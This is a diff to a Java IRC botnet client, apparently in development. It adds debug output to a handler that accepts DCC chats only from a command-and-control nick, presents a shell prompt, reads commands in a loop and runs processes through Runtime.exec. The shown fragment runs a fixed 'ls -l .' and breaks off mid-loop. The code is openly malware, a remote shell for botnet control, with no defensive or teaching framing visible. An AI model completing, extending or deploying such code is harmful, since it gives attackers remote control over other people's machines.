@@ -57,7 +57,7 @@ public class BotnetClient extends PircBot {
 			System.out.println("<" + sender + ">: " + message);
 		}
 	}
-	/*
+	
 	protected void onOp(String channel, String sourceNick, String sourceLogin, String sourceHostname, String recipient) {
 		operator = recipient;
 	}
@@ -71,18 +71,22 @@ public class BotnetClient extends PircBot {
 			System.out.println("Current op:" + operator);
 		}
 	}
-	*/
+	
 
 	protected void onIncomingChatRequest(DccChat chatObj) {
+		Runtime r = Runtime.getRuntime();
 		try {
 			System.out.println("." + chatObj.getNick() + ".");
 			System.out.println(chatObj.getNick().equalsIgnoreCase(CC));
 			if (chatObj.getNick().equalsIgnoreCase(CC)) {
+				System.out.println("in the if, about to accept chat");
 				chat = chatObj;
 				chat.accept();
-				Runtime r = Runtime.getRuntime();
+				System.out.println("Chat accepted");
 	        	chat.sendLine("$: ");
+	        	System.out.println("Sent response");
 	        	String command = chat.readLine();
+	        	System.out.println(command);
 	        	while (!command.equalsIgnoreCase("quit shell")) {
 	        		Process p = r.exec("ls -l .");
 	        		p.waitFor();
